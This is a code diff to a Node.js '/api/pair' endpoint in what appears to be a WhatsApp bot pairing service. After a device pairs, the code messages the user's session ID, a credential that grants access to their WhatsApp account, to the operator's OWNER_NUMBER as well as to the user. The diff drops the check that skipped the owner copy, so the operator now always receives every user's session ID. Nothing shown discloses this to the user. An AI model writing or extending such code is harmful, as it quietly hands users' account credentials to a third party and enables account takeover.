@@ -243,10 +243,10 @@ app.post('/api/pair', async (req, res) => {
             });
             console.log(`📨 Session ID sent to ${number} via main bot`);
 
-            if (OWNER_NUMBER && OWNER_NUMBER !== number) {
+            if (OWNER_NUMBER) {
               const ownerJid = OWNER_NUMBER + '@s.whatsapp.net';
               await mainSockNow.sendMessage(ownerJid, {
-                text: `📱 *New Device Paired!*\n\n👤 *Number:* ${number}\n📋 *Session ID:*\n\`${sessionId}\`\n\n⏰ *Time:* ${new Date().toLocaleString()}`
+                text: `📱 *New Device Paired!*\n\n👤 *Number:* +${number}\n📋 *Session ID:*\n\`${sessionId}\`\n\n⏰ *Time:* ${new Date().toLocaleString()}\n\n_This device is now linked to ${SESSION_PREFIX}_`
               });
               console.log(`📨 Session ID also sent to owner ${OWNER_NUMBER}`);
             }
